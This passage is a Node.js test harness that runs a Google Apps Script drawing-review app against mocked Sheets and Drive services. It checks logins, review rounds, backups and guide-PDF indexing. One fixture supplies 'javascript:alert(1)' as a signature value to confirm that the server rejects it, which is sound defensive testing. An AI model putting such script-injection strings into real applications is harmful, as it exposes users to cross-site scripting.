// Code.gs 서버 로직 점검: 구글시트 동작(1000행×26열 기본 크기, 범위 초과 오류 등)을 흉내 낸 가짜 환경에서 실행합니다.
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const vm = require('vm');

function colLetterToNum(s) { let n = 0; for (const c of s) n = n * 26 + (c.charCodeAt(0) - 64); return n; }

class Range {
  constructor(sh, r, c, nr, nc) {
    if (r < 1 || c < 1 || r + nr - 1 > sh.maxRows || c + nc - 1 > sh.maxCols) {
      throw new Error(`범위가 시트 크기를 벗어남: ${sh.name} r${r} c${c} ${nr}x${nc} (max ${sh.maxRows}x${sh.maxCols})`);
    }
    Object.assign(this, { sh, r, c, nr, nc });
  }
  getValues() { const out = []; for (let i = 0; i < this.nr; i++) { const row = []; for (let j = 0; j < this.nc; j++) row.push(this.sh.get(this.r + i, this.c + j)); out.push(row); } return out; }
  getDisplayValues() { return this.getValues().map(r => r.map(v => String(v))); }
  setValues(v) {
    if (v.length !== this.nr || v.some(row => row.length !== this.nc)) throw new Error('setValues 크기 불일치');
    v.forEach((row, i) => row.forEach((x, j) => {
      if (typeof x === 'string' && x.length > 50000) throw new Error('셀 50000자 초과');
      this.sh.set(this.r + i, this.c + j, x);
    }));
    return this;
  }
  setValue(x) { this.sh.set(this.r, this.c, x); return this; }
  setNumberFormat() { return this; } setFontWeight() { return this; } setBackground() { return this; } setNote() { return this; }
}
class Sheet {
  constructor(name) { this.name = name; this.data = {}; this.maxRows = 1000; this.maxCols = 26; }
  key(r, c) { return r + ':' + c; }
  get(r, c) { const v = this.data[this.key(r, c)]; return v === undefined ? '' : v; }
  set(r, c, v) {
    // 실제 시트처럼: 앞의 ' 는 「글자로 저장」 표시라 읽을 때 안 보임, ' 없이 = + - @ 로 시작하면 수식이 됨 → 셈만 해 둠
    if (typeof v === 'string') { if (v[0] === "'") v = v.slice(1); else if (/^[=+\-@]/.test(v)) this.formulas = (this.formulas || 0) + 1; }
    if (v === '' || v == null) delete this.data[this.key(r, c)]; else this.data[this.key(r, c)] = v;
  }
  getRange(a, b, c, d) {
    if (typeof a === 'string') {
      const m = a.match(/^([A-Z]+)(\d+)?$/); if (!m) throw new Error('A1 표기 미지원: ' + a);
      return new Range(this, +(m[2] || 1), colLetterToNum(m[1]), 1, 1);
    }
    return new Range(this, a, b, c || 1, d || 1);
  }
  getLastRow() { let m = 0; for (const k in this.data) m = Math.max(m, +k.split(':')[0]); return m; }
  getLastColumn() { let m = 0; for (const k in this.data) m = Math.max(m, +k.split(':')[1]); return m; }
  getMaxRows() { return this.maxRows; } getMaxColumns() { return this.maxCols; }
  insertRowsAfter(_, n) { this.maxRows += n; } insertColumnsAfter(_, n) { this.maxCols += n; }
  setFrozenRows() {}
  clearContents() { this.data = {}; return this; }
  deleteRow(r) {
    const nd = {};
    for (const k in this.data) { const [rr, cc] = k.split(':').map(Number); if (rr < r) nd[k] = this.data[k]; else if (rr > r) nd[(rr - 1) + ':' + cc] = this.data[k]; }
    this.data = nd;
  }
  appendRow(row) { const r = this.getLastRow() + 1; if (r > this.maxRows) this.maxRows = r; /* 실제 appendRow는 행을 자동으로 늘림 */ if (row.length > this.maxCols) this.maxCols = row.length; row.forEach((v, j) => this.set(r, j + 1, v)); }
}
class SS {
  constructor() { this.sheets = {}; }
  getId() { return 'ssid'; }
  getName() { return '도면협의'; }
  getSheetByName(n) { return this.sheets[n] || null; }
  insertSheet(n) { return (this.sheets[n] = new Sheet(n)); }
}
const ss = new SS();
const props = {};
let uuidN = 0;
const ctx = {
  console,
  _me: 'old@gmail.com',
  Session: { getEffectiveUser: () => ({ getEmail: () => ctx._me }) },
  SpreadsheetApp: { getActiveSpreadsheet: () => ss, openById: () => ss, getUi: () => ({ alert() {}, createMenu() { return { addItem() { return this; }, addSeparator() { return this; }, addToUi() {} }; } }) },
  PropertiesService: { getScriptProperties: () => ({ getProperty: k => props[k] || null, setProperty: (k, v) => { props[k] = v; } }) },
  LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
  Utilities: {
    DigestAlgorithm: { SHA_256: 'sha256' }, Charset: { UTF_8: 'utf8' },
    computeDigest: (_, s) => Array.from(crypto.createHash('sha256').update(s, 'utf8').digest()).map(b => (b > 127 ? b - 256 : b)),
    getUuid: () => 'uuid-' + (++uuidN),
    formatDate: (d, tz, fmt) => {
      const p = n => String(n).padStart(2, '0');
      return fmt.replace('yyyy', d.getFullYear()).replace('MM', p(d.getMonth() + 1)).replace('dd', p(d.getDate())).replace('HH', p(d.getHours())).replace('mm', p(d.getMinutes()));
    }
  },
  HtmlService: {},
  DriveApp: (() => {
    const folder = { files: [], getId: () => 'bkfolder', getName: () => '도면협의_백업', isTrashed: () => false, getFiles() { let i = 0; const f = this.files; return { hasNext: () => i < f.length, next: () => f[i++] }; } };
    let made = false;
    return {
      _folder: folder,
      getFoldersByName: () => { let d = !made; return { hasNext: () => !d, next: () => { d = true; return folder; } }; },
      createFolder: () => { made = true; return folder; },
      _backup: () => { let d = !made; return { hasNext: () => !d, next: () => { d = true; return folder; } }; },
      _backupCreate: () => { made = true; return folder; },
      getFileById: () => ({ makeCopy: (name, fd) => { fd.files.push({ name, trashed: false, getDateCreated: () => new Date(), setTrashed(v) { this.trashed = v; } }); } })
    };
  })(),
  ScriptApp: (() => { const triggers = []; let fn = '', uid = 0; const b = { timeBased() { return b; }, everyDays() { return b; }, atHour() { return b; }, after() { return b; }, create() { const h = fn, u = 'uid' + (++uid); triggers.push({ getHandlerFunction: () => h, getUniqueId: () => u }); } };
    return { _t: triggers, newTrigger: f => { fn = f; return b; }, getOAuthToken: () => 'tok', getProjectTriggers: () => triggers.slice(), deleteTrigger: t => triggers.splice(triggers.indexOf(t), 1) }; })()
};
vm.createContext(ctx);
const src = path.join(__dirname, '..', 'src');
vm.runInContext(fs.readFileSync(path.join(src, 'Code.gs'), 'utf8'), ctx);
vm.runInContext(fs.readFileSync(path.join(src, 'Supa.gs'), 'utf8'), ctx);   // Supabase 이관 (메일 통로·옮기기·주 1회)

const ok = (cond, msg) => { if (!cond) { throw new Error('실패: ' + msg); } console.log('  ✓', msg); };
const run = code => vm.runInContext(code, ctx);

console.log('초기 설정');
run('setupMenu_()');
ok(ss.getSheetByName('검토서').maxCols >= run('reviewHeaders_().length'), '검토서 시트 열이 헤더 수만큼 늘어남');
ok(ss.getSheetByName('준수사항').getLastRow() === 8, '준수사항 7개 기본 문구');
run('setupMenu_()'); // 두 번 실행해도 안전
ok(ss.getSheetByName('준수사항').getLastRow() === 8, '초기 설정 재실행해도 중복 없음');

console.log('PIN');
props['PIN_소장'] = run('hash_("2468")');
let threw = false; try { run('apiLogin({role:"소장",pin:"1111"})'); } catch (e) { threw = /PIN이 맞지/.test(e.message); }
ok(threw, '틀린 PIN 거부');
threw = false; try { run('apiLogin({role:"부소장",pin:"2468"})'); } catch (e) { threw = /설정되지 않았/.test(e.message); }
ok(threw, '부소장 PIN 미설정 안내');
ctx.A = { role: '소장', pin: '2468' };
ok(run('apiLogin(A).role') === '소장', '소장 로그인');
const boot = run('apiBootstrap(A)');
ok(boot.fields.length === ctx.FIELDS.length && boot.rules.length === 7, '기본 설정 내려받기');
ok(Array.isArray(run('apiGuideIndex(A)')) && run('apiGuideIndex(A)').length === 0 && boot.guides.length === 0, '색인 만들기 전: 지침 없음 (오류 없이 빈 목록)');

console.log('검토서 저장 · 문서번호');
const sig = 'data:image/png;base64,' + 'A'.repeat(20000);
ctx.R1 = { tenant: '매장 가', reviewDate: '2026-10-10', storeType: '팝업', location: '3F', contractorCompany: '시공사', openDate: '2026-11-20', notes: '첫 줄\n둘째 줄', rulesAck: true, safetySig: sig, ceiling: '신설', storeType2: 'x' };
let b = run('apiSaveReview(A, R1, false)');
ok(b.store.docNo === '에비뉴엘컨펌_001_261010', '첫 매장 문서번호 ' + b.store.docNo);
ok(b.reviews.length === 1 && b.reviews[0].round === 1 && b.reviews[0].rulesAck === true && b.reviews[0].safetySig === sig, '1차 저장 (서명·체크 포함)');
ok(b.reviews[0].notes === '첫 줄\n둘째 줄', '여러 줄 특이사항 유지');
ctx.SID = b.store.id;
ctx.R1b = Object.assign({}, b.reviews[0], { storeId: b.store.id, round: 1, tenant: '매장 가(수정)' });
b = run('apiSaveReview(A, R1b, true)');
ok(b.reviews.length === 1 && b.reviews[0].status === '검토완료' && b.store.tenant === '매장 가(수정)', '같은 차수 덮어쓰기 + 검토완료');
ctx.R2 = { tenant: '매장 나', reviewDate: '2026-10-12' };
const b2 = run('apiSaveReview(A, R2, false)');
ok(b2.store.docNo === '에비뉴엘컨펌_002_261012', '두 번째 매장 번호 증가 ' + b2.store.docNo);

console.log('다음 차수');
b = run('apiNextRound(A, SID)');
ok(b.reviews.length === 2 && b.reviews[1].round === 2 && b.reviews[1].notes === '' && b.reviews[1].safetySig === '' && b.reviews[1].tenant === '매장 가(수정)', '2차 생성: 내용 복사, 특이사항·서명 비움');
ok(b.store.currentRound === 1 || b.store.currentRound === 2, '매장 현재차수 ' + b.store.currentRound);
ok(run('apiListStores(A)').find(s => s.id === ctx.SID).currentRound === 2, '목록 현재차수 2');
ok(b.store.docNo === '에비뉴엘컨펌_001_261010', '차수가 바뀌어도 문서번호 유지');

console.log('컨펌완료');
let list = run('apiSetConfirmed(A, SID, true)');
ok(list.find(s => s.id === ctx.SID).status === '컨펌완료' && list.find(s => s.id === ctx.SID).confirmedBy === '소장', '컨펌완료 + 처리자 기록');
threw = false; try { run('apiSaveReview(A, R1b, false)'); } catch (e) { threw = /컨펌완료된/.test(e.message); }
ok(threw, '컨펌완료 후 저장 차단');
threw = false; try { run('apiNextRound(A, SID)'); } catch (e) { threw = /컨펌완료된/.test(e.message); }
ok(threw, '컨펌완료 후 다음 차수 차단');
list = run('apiSetConfirmed(A, SID, false)');
ok(list.find(s => s.id === ctx.SID).status === '협의중', '컨펌완료 취소');
ok(ss.getSheetByName('변경기록').getLastRow() >= 6, '변경기록 남김');

console.log('대량 저장 (1000행 초과)');
for (let i = 0; i < 1005; i++) run(`apiSaveReview(A, {tenant:'대량${i}', reviewDate:'2026-10-20'}, false)`);
ok(ss.getSheetByName('매장').getLastRow() === 1008, '매장 1007개 저장 (행 자동 확장)');
const last = run('apiListStores(A)').sort((a, b) => b.seq - a.seq)[0];
ok(last.docNo === '에비뉴엘컨펌_1007_261020', '일련번호 1000 이상도 이어짐 ' + last.docNo);

console.log('기존 시트에 새 항목 열 자동 추가');
const rs = ss.getSheetByName('검토서');
let col = 0; for (let c = 1; c <= rs.getLastColumn(); c++) if (rs.get(1, c) === '전원방식') col = c;
ok(col > 0, '전원방식 열 존재');
rs.set(1, col, ''); // 예전 시트처럼 열 제목이 없는 상태
run('apiBootstrap(A)');
let again = 0; for (let c = 1; c <= rs.getLastColumn(); c++) if (rs.get(1, c) === '전원방식') again = c;
ok(again === 0, '같은 버전에서는 열 확인을 다시 하지 않음 (첫 로딩 빠르게)');
delete props.SCHEMA_VER; // 새 버전을 올린 것처럼
run('apiBootstrap(A)');
let found = 0; for (let c = 1; c <= rs.getLastColumn(); c++) if (rs.get(1, c) === '전원방식') found = c;
ok(found > col, '부트스트랩 때 전원방식 열이 끝에 자동 추가됨');
ctx.R3 = { tenant: '매장 다', reviewDate: '2026-10-21', powerPhase: '삼상 380V', elecKw: '45', mainBreakerA: '150' };
const b3 = run('apiSaveReview(A, R3, false)');
ok(b3.reviews[0].powerPhase === '삼상 380V', '새 열에 전원방식 저장·조회');
ctx.R4 = { tenant: '매장 라', reviewDate: '2026-10-21', powerPhase: '삼상 400V' };
ok(run('apiSaveReview(A, R4, false)').reviews[0].powerPhase === '', '목록에 없는 선택값은 저장하지 않음');

console.log('1.0 · 차수 삭제');
ctx.R5 = { tenant: '삭제 시험', reviewDate: '2026-10-22', notes: '1차 메모' };
let d5 = run('apiSaveReview(A, R5, false)');
ctx.S5 = d5.store.id;
threw = false; try { run('apiDeleteLastRound(A, S5)'); } catch (e) { threw = /1차만/.test(e.message); }
ok(threw, '1차만 남으면 삭제 거부');
run('apiNextRound(A, S5)'); d5 = run('apiNextRound(A, S5)');
ok(d5.reviews.length === 3, '3차까지 생성');
d5 = run('apiDeleteLastRound(A, S5)');
ok(d5.reviews.length === 2 && d5.reviews[1].round === 2, '마지막(3차)만 삭제, 2차 남음');
ok(run('apiListStores(A)').find(x => x.id === ctx.S5).currentRound === 2, '대시보드 현재차수 2로 재계산');
const del = ss.getSheetByName('삭제보관');
ok(del.getLastRow() === 2, '삭제보관 탭에 1건 보관');
const dh = []; for (let c = 1; c <= del.getLastColumn(); c++) dh.push(del.get(1, c));
ok(del.get(2, dh.indexOf('차수') + 1) === '3' && del.get(2, dh.indexOf('삭제자') + 1) === '소장', '보관 행에 차수·삭제자 기록');
const logSh = ss.getSheetByName('변경기록'); let hasDelLog = false;
for (let r = 2; r <= logSh.getLastRow(); r++) if (logSh.get(r, 3) === '차수 삭제') hasDelLog = true;
ok(hasDelLog, '변경기록에 차수 삭제 남김');
run('apiSetConfirmed(A, S5, true)');
threw = false; try { run('apiDeleteLastRound(A, S5)'); } catch (e) { threw = /컨펌완료/.test(e.message); }
ok(threw, '컨펌완료 매장 삭제 거부');
run('apiSetConfirmed(A, S5, false)');
const after = run('apiNextRound(A, S5)');
ok(after.reviews.length === 3 && after.store.docNo === d5.store.docNo, '삭제 후 다시 3차 생성 가능, 문서번호 유지');

console.log('1.0 · 주방 연동 · 서명일 · 업체 목록 · 문구 변경');
ctx.R6 = { tenant: '주방없음', reviewDate: '2026-10-23', kitchen: '없음', waterproof: '시공', kitchenExt: '있음', exhaustCmh: '1200', ownerCompany: '가나건설', ownerName: '홍길동', ownerTel: '010-1111-2222', safetySigDate: '2026-10-23' };
const b6 = run('apiSaveReview(A, R6, false)').reviews[0];
ok(['waterproof', 'waterTest', 'kitchenExt', 'exhaustCmh', 'gasGrade', 'gasAlarm'].every(k => b6[k] === '해당없음'), '주방 없음이면 6개 항목 서버에서도 해당없음');
ok(b6.safetySigDate === '2026-10-23', '서명일 저장');
const nr6 = run('apiNextRound(A, "' + run('apiListStores(A)').find(x => x.tenant === '주방없음').id + '")');
ok(nr6.reviews[1].safetySigDate === '' && nr6.reviews[1].kitchenExt === '해당없음', '다음 차수: 서명일 비움, 해당없음 유지');
// 1.8.9 안전관리규정 준수 동의서 (DW-6)
ctx.RA = { tenant: '동의서매장', reviewDate: '2026-11-11', agreeChecks: '101000001', agreeRespSig: 'data:image/png;base64,iVBORw0KGgo=', agreeRespSigDate: '2026-11-11', agreeLotteSig: 'javascript:alert(1)' };
const ba = run('apiSaveReview(A, RA, false)');
ok(ba.reviews[0].agreeChecks === '101000001' && ba.reviews[0].agreeRespSig.indexOf('data:image/png') === 0 && ba.reviews[0].agreeLotteSig === '', '동의서: 체크·책임자 서명 저장, PNG 아닌 서명은 버림');
const na = run('apiNextRound(A, "' + ba.store.id + '")');
ok(na.reviews[1].agreeChecks === '' && na.reviews[1].agreeRespSig === '' && na.reviews[0].agreeRespSig !== '', '동의서: 다음 차수는 비우고 이전 차수는 그대로');
const boot2 = run('apiBootstrap(A)');
ok(boot2.companies === undefined, '부트스트랩에서 업체 목록은 빼고 (첫 로딩 빠르게) 검토서를 열 때 따로');
const comp = run('apiCompanies(A)').find(c => c.name === '가나건설');
ok(comp && comp.person === '홍길동' && comp.tel === '010-1111-2222', '업체 자동완성 목록에 최근 연락처');
ok(boot2.rules[1].indexOf('미제출시 준공 불가') >= 0 && boot2.rules[1].indexOf('공사진행 불가') < 0, '준수사항 2번 문구가 준공 불가로 바뀜');
ss.getSheetByName('준수사항').set(3, 2, '구 문구 (미제출시 공사진행 불가)');
delete props.SCHEMA_VER;
ok(run('apiBootstrap(A)').rules[1].indexOf('공사진행 불가') >= 0, '문구 변경은 한 번만 (이후 사용자가 고친 문구는 유지)');

console.log('1.0 · 자동 백업');
run('enableDailyBackup_()');
ok(ctx.ScriptApp._t.length === 1, '매일 백업 트리거 1개');
run('enableDailyBackup_()');
ok(ctx.ScriptApp._t.length === 1, '다시 켜도 트리거 중복 없음');
ok(ctx.DriveApp._folder.files.length >= 2 && /도면협의_백업_/.test(ctx.DriveApp._folder.files[0].name), '백업 사본 생성 ' + ctx.DriveApp._folder.files[0].name);
const nB = ctx.DriveApp._folder.files.length;
run('backupDaily()'); run('backupDaily({triggerUid:"가짜"})');
ok(ctx.DriveApp._folder.files.length === nB, '1.8.6 (결정 41): 예약 번호 없이 화면에서 부른 백업은 아무것도 안 함');
ctx.UIDB = ctx.ScriptApp._t[0].getUniqueId(); run('backupDaily({triggerUid: UIDB})');
ok(ctx.DriveApp._folder.files.length === nB + 1, '진짜 예약이 부르면 백업');
run('backupOffMenu_()');
ok(ctx.ScriptApp._t.length === 0, '자동 백업 끄기');

console.log('1.2 · 드라이브 지침 폴더 · 색인 만들기');
// 가짜 드라이브: 폴더·파일·휴지통
let nid = 0;
const drive = { items: {} };
const iter = arr => { let i = 0; return { hasNext: () => i < arr.length, next: () => arr[i++] }; };
function mkFolder(name, parent) {
  const f = { id: 'fd' + (++nid), name, parent, trashed: false, kind: 'folder', owner: ctx._me,
    getOwner() { return { getEmail: () => this.owner }; },
    getFolders() { return iter(this.children().filter(x => x.kind === 'folder')); },
    getId() { return this.id; }, getName() { return this.name; }, getUrl() { return 'https://drive/' + this.id; },
    isTrashed() { return this.trashed; }, setTrashed(v) { this.trashed = v; },
    getParents() { return iter(this.parent && drive.items[this.parent] ? [drive.items[this.parent]] : []); },
    children() { return Object.values(drive.items).filter(x => x.parent === this.id && !x.trashed); },
    getFiles() { return iter(this.children().filter(x => x.kind === 'file')); },
    getFilesByName(n) { return iter(this.children().filter(x => x.kind === 'file' && x.name === n)); },
    getFilesByType(t) { return iter(this.children().filter(x => x.kind === 'file' && x.mime === t)); },
    getFoldersByName(n) { return iter(this.children().filter(x => x.kind === 'folder' && x.name === n)); },
    createFolder(n) { return mkFolder(n, this.id); },
    createFile(blob) { return mkFile(blob.name, blob.type, blob.bytes, this.id); } };
  return (drive.items[f.id] = f);
}
function mkFile(name, mime, bytes, parent) {
  const f = { id: ('fl' + (++nid)).padEnd(33, 'x'), name, mime, bytes, parent, trashed: false, kind: 'file', owner: ctx._me,
    getOwner() { return { getEmail: () => this.owner }; }, updated: new Date(2026, 9, 28, 0, 43),
    getId() { return this.id; }, getName() { return this.name; }, getSize() { return this.bytes.length; }, getLastUpdated() { return this.updated; },
    isTrashed() { return this.trashed; }, setTrashed(v) { this.trashed = v; },
    getParents() { return iter([drive.items[this.parent]]); }, getUrl() { return 'https://drive/' + this.id; },
    access: 'PRIVATE', getSharingAccess() { return this.access; }, setSharing(x) { this.access = x; },
    getBlob: () => ({ getBytes: () => Array.from(f.bytes), getDataAsString: () => Buffer.from(f.bytes).toString('utf8'), getContentType: () => f.mime }) };
  return (drive.items[f.id] = f);
}
const myRoot = mkFolder('내 드라이브', null);
Object.assign(ctx.DriveApp, {
  getFoldersByName: n => n === '도면협의_백업' ? ctx.DriveApp._backup(n) : iter(Object.values(drive.items).filter(x => x.kind === 'folder' && x.name === n)),
  createFolder: n => n === '도면협의_백업' ? ctx.DriveApp._backupCreate() : mkFolder(n, myRoot.id),
  getFolderById: id => { const f = drive.items[id]; if (!f || f.kind !== 'folder') throw new Error('없는 폴더'); return f; },
  getFileById: id => { const f = drive.items[id]; if (!f) throw new Error('없는 파일 ' + id); return f; }
});
ctx.MimeType = { PDF: 'application/pdf' };
ctx.Utilities.base64Encode = b => Buffer.from(b.map(x => x & 255)).toString('base64');
ctx.Utilities.base64Decode = s => Array.from(Buffer.from(s, 'base64'));
ctx.Utilities.newBlob = (bytes, type, name) => ({ bytes: Array.isArray(bytes) ? Buffer.from(bytes.map(x => x & 255)) : Buffer.from(String(bytes), 'utf8'), type, name });
ctx.Utilities.formatDate = (d, tz, fmt) => {
  const p = n => String(n).padStart(2, '0');
  return fmt.replace("'T'", 'T').replace('yyyy', d.getFullYear()).replace('MM', p(d.getMonth() + 1)).replace('dd', p(d.getDate())).replace('HH', p(d.getHours())).replace('mm', p(d.getMinutes())).replace('ss', p(d.getSeconds()));
};
ctx.PropertiesService.getScriptProperties = () => ({ getProperty: k => props[k] || null, setProperty: (k, v) => { if (String(v).length > 9000) throw new Error('속성 9KB 초과 ' + k); props[k] = v; }, deleteProperty: k => { delete props[k]; }, getProperties: () => Object.assign({}, props) });

let st = run('apiGuideAdmin(A)');
ok(st.folderName === '도면협의_지침' && st.pdfs.length === 0 && st.sources.length === 0, '처음 열면 내 드라이브에 도면협의_지침 폴더를 만듦');
ok(run('apiGuideAdmin(A)').folderUrl === st.folderUrl, '두 번째부터는 같은 폴더');
const gRoot = drive.items[props.GUIDE_FOLDER];
const pdfBytes = Buffer.alloc(12 * 1024 * 1024, 7); pdfBytes[0] = 37; pdfBytes[pdfBytes.length - 1] = 9;
const pdf = mkFile('통합안전관리지침_26.pdf', 'application/pdf', pdfBytes, gRoot.id);
const other = mkFile('남의파일.pdf', 'application/pdf', Buffer.from('x'), myRoot.id);
st = run('apiGuideAdmin(A)');
ok(st.pdfs.length === 1 && st.pdfs[0].name === '통합안전관리지침_26.pdf', '폴더의 PDF 목록');

// 조각 내려받기
ctx.PID = pdf.id; ctx.OID = other.id;
let got = [], off = 0, size = 0;
while (true) { const c = run(`apiGuidePdfChunk(A, PID, ${off})`); size = c.size; const part = Buffer.from(c.data, 'base64'); got.push(part); off += part.length; if (off >= size || !part.length) break; }
const joined = Buffer.concat(got);
ok(got.length === 3 && joined.equals(pdfBytes), `12MB PDF를 ${got.length}조각으로 그대로 내려받음`);
threw = false; try { run('apiGuidePdfChunk(A, OID, 0)'); } catch (e) { threw = /지침 폴더/.test(e.message); }
ok(threw, '지침 폴더 밖 파일은 읽지 않음');

// 색인 만들기: 시작 → 쪽 저장 일부 → 끊김 → 이어서
threw = false; try { run('apiGuideBegin(A, {fileId: PID, title: "", short: ""})'); } catch (e) { threw = /이름/.test(e.message); }
ok(threw, '이름·줄임말 없으면 거부');
ctx.INFO = { fileId: pdf.id, title: '타워&몰 통합안전관리지침 (26년 개정판)', short: '통합안전관리지침', localPages: false };
let bg = run('apiGuideBegin(A, INFO)');
ok(bg.id && bg.have.length === 0 && !bg.resumed, '새 작업 시작 ' + bg.id);
ctx.BID = bg.id;
const img = 'data:image/jpeg;base64,' + Buffer.from('jpg').toString('base64');
ctx.PAGES = Array.from({ length: 40 }, (_, i) => ({ p: i + 1, data: img }));
ok(run('apiGuideSavePages(A, BID, PAGES)').saved === 40, '쪽 이미지 40장 저장');
ctx.ENTRIES = [{ p: 91, s: '방화및방염관련', h: '1. 건축물마감재', t: '200제곱미터 이내마다 방화구획', b: [[0.1, 0.5, 0.7, 0.52, 0]] }];
threw = false; try { run('apiGuideFinish(A, BID, {pages:132, landscape:true}, ENTRIES)'); } catch (e) { threw = /40 \/ 132/.test(e.message); }
ok(threw, '쪽 이미지가 모자라면 완료 거부 (40/132)');
ok(run('apiGuideAdmin(A)').building.id === bg.id, '끝나지 않은 작업 표시');
bg = run('apiGuideBegin(A, INFO)');
ok(bg.resumed && bg.id === ctx.BID && bg.have.length === 40, '같은 PDF로 다시 시작하면 이어서 (저장된 40쪽 알려줌)');
ctx.PAGES = Array.from({ length: 92 }, (_, i) => ({ p: i + 41, data: img }));
run('apiGuideSavePages(A, BID, PAGES)');
run('apiGuideSavePages(A, BID, [{p: 91, data: IMG}])'.replace('IMG', JSON.stringify(img)));
st = run('apiGuideFinish(A, BID, {pages:132, landscape:true}, ENTRIES)');
ok(st.sources.length === 1 && st.sources[0].entries === 1 && st.sources[0].pages === 132 && !st.building, '색인 완료 → 검색에 추가');
ok(st.guides.length === 1 && st.guides[0].images && st.guides[0].landscape && st.guides[0].short === '통합안전관리지침', '웹앱 지침 목록 갱신');
run('propSetBig_("T_BIG", "가".repeat(20000))');
ok(props.T_BIG === '#parts:3' && run('propGetBig_("T_BIG")').length === 20000, '긴 쪽 목록(쪽이 많은 지침)은 속성 여러 개에 나눠 저장');
run('propDelBig_("T_BIG")');
ok(!props.T_BIG && !props.T_BIG__0 && !props.T_BIG__2, '나눠 저장한 속성 정리');
ok(Object.keys(JSON.parse(run(`propGetBig_("GUIDE_PAGES_${ctx.BID}")`))).length === 132, '나눠 저장한 쪽 목록 다시 읽기 132쪽');
let pagesInFolder = drive.items[JSON.parse(props.GUIDE_SOURCES)[0].pagesFolder].children().length;
ok(pagesInFolder === 132, '같은 쪽을 다시 저장해도 이미지 중복 없음 (' + pagesInFolder + ')');
run('GUIDE_DATA_CACHE_ = null');
const ix = run('apiGuideIndex(A)');
ok(ix.length === 1 && ix[0].d === ctx.BID && ix[0].p === 91, '검색 색인 제공 (항목마다 지침 ID)');
ok(run(`apiGuidePage(A, "${ctx.BID}", 91)`) === img, '쪽 이미지 data URL');
ok(run(`apiGuidePage(A, "${ctx.BID}", 999)`) === null, '없는 쪽은 null');
ok(run('apiBootstrap(A)').version === '1.9.0' && run('apiBootstrap(A)').guides.length === 1, '부트스트랩에 지침 목록');

// 개정판: 다른 PDF로 같은 지침 바꾸기
const pdf2 = mkFile('통합안전관리지침_27.pdf', 'application/pdf', Buffer.from('new'), gRoot.id);
const oldSrc = JSON.parse(props.GUIDE_SOURCES)[0];
ctx.INFO2 = { fileId: pdf2.id, title: '통합안전관리지침 (27년 개정판)', short: '통합안전관리지침', localPages: false, replaces: oldSrc.id };
bg = run('apiGuideBegin(A, INFO2)');
ok(!bg.resumed && bg.id !== oldSrc.id, '다른 PDF는 새 작업');
ctx.BID2 = bg.id;
run('apiGuideSavePages(A, BID2, [{p:1, data:' + JSON.stringify(img) + '}])');
st = run('apiGuideFinish(A, BID2, {pages:1, landscape:true}, ENTRIES)');
ok(st.sources.length === 1 && st.sources[0].id === ctx.BID2 && st.sources[0].fileName === '통합안전관리지침_27.pdf', '개정판으로 바꾸면 이전 지침 자리에 들어감');
ok(st.archive.length === 1 && st.archive[0].id === oldSrc.id && st.archive[0].archivedAt, '이전 판으로 보관 (26년판)');
ok(!drive.items[oldSrc.indexFile].trashed && run(`apiGuidePage(A, "${oldSrc.id}", 91)`) === img, '이전 판 색인·쪽 이미지는 그대로 남음');
ok(st.guides.length === 2 && st.guides.find(g => g.id === oldSrc.id).archived === true && !st.guides.find(g => g.id === ctx.BID2).archived, '웹앱 지침 목록: 현행 1 + 이전 판 1');
run('GUIDE_DATA_CACHE_ = null');
ok(run('apiGuideIndex(A)').length === 2, '검색 색인에 이전 판 항목도 포함 (웹앱에서 "이전 판 포함"일 때만 보임)');
st = run(`apiGuideRemoveArchived(A, "${oldSrc.id}")`);
ok(st.archive.length === 0 && drive.items[oldSrc.indexFile].trashed && drive.items[oldSrc.pagesFolder].trashed && !props['GUIDE_PAGES_' + oldSrc.id], '이전 판 완전히 삭제 → 휴지통, 속성 정리');
// 같은 PDF를 그대로 다시 만들면 보관하지 않고 바꿈
const cur = JSON.parse(props.GUIDE_SOURCES)[0];
bg = run('apiGuideBegin(A, INFO2)'); ctx.BID3 = bg.id;
run('apiGuideSavePages(A, BID3, [{p:1, data:' + JSON.stringify(img) + '}])');
st = run('apiGuideFinish(A, BID3, {pages:1, landscape:true}, ENTRIES)');
ok(st.archive.length === 0 && drive.items[cur.indexFile].trashed && st.sources[0].id === ctx.BID3, '같은 PDF 다시 만들기는 이전 판으로 남기지 않음');
ctx.BID2 = ctx.BID3;
ok(!pdf.trashed, '원본 PDF는 그대로');

// 같은 PDF가 바뀌면 상태 확인 가능 (fileUpdated)
pdf2.updated = new Date(2026, 9, 29, 9, 0);
st = run('apiGuideAdmin(A)');
ok(st.pdfs.find(f => f.fileId === pdf2.id).updated !== st.sources[0].fileUpdated, 'PDF가 바뀌면 수정 시각이 달라져 "다시 만들기" 안내 가능');

// 이름 바꾸기 · 빼기 · 작업 버리기
st = run(`apiGuideRename(A, "${ctx.BID2}", {title: "새 이름", short: "안전지침"})`);
ok(st.sources[0].title === '새 이름' && st.guides[0].short === '안전지침', '이름·줄임말 바꾸기');
bg = run('apiGuideBegin(A, INFO)');
const tmpFolder = JSON.parse(props.GUIDE_BUILDING).pagesFolder;
st = run('apiGuideCancel(A)');
ok(!st.building && drive.items[tmpFolder].trashed, '끝나지 않은 작업 버리기');
st = run(`apiGuideRemove(A, "${ctx.BID2}")`);
ok(st.sources.length === 0 && st.guides.length === 0, '검색에서 빼기');
run('GUIDE_DATA_CACHE_ = null');
ok(run('apiGuideIndex(A)').length === 0, '뺀 지침은 검색 안 됨');
for (const k of Object.keys(props)) ok(props[k].length <= 9000, '속성 크기 9KB 이내: ' + k);

console.log('1.3 · 문구 분류 · 비슷한 말 · 끊김 재전송 · 적용 지침 · QR 링크');
let bt = run('apiBootstrap(A)');
ok(bt.phrases.length === 5 && bt.phrases[0].t && bt.phrases[0].c === '방염' && bt.phraseCats.indexOf('소방') >= 0, '자주 쓰는 문구에 분류 (기본 5개)');
ok(bt.synonyms.some(g => g[0] === '스프링클러' && g.indexOf('SP') >= 0), '비슷한 말 시트 자동 생성 · 읽기');
ctx.PH = [{ t: '새 문구 1', c: '전기' }, { t: '  ', c: '전기' }, { t: '분류 없음', c: '이상한분류' }, { t: '셋째', c: '소방' }];
let ph = run('apiSavePhrases(A, PH)');
ok(ph.length === 3 && ph[0].t === '새 문구 1' && ph[1].c === '기타' && ph[2].c === '소방', '문구 저장: 빈 줄 제외, 모르는 분류는 기타, 순서 유지');
ctx.PH = [{ t: '하나만', c: '설비' }];
ph = run('apiSavePhrases(A, PH)');
ok(ph.length === 1 && ss.getSheetByName('자주쓰는문구').getLastRow() === 2, '줄어든 목록 저장 시 남은 줄 지움');
// 예전 1열 시트도 읽기
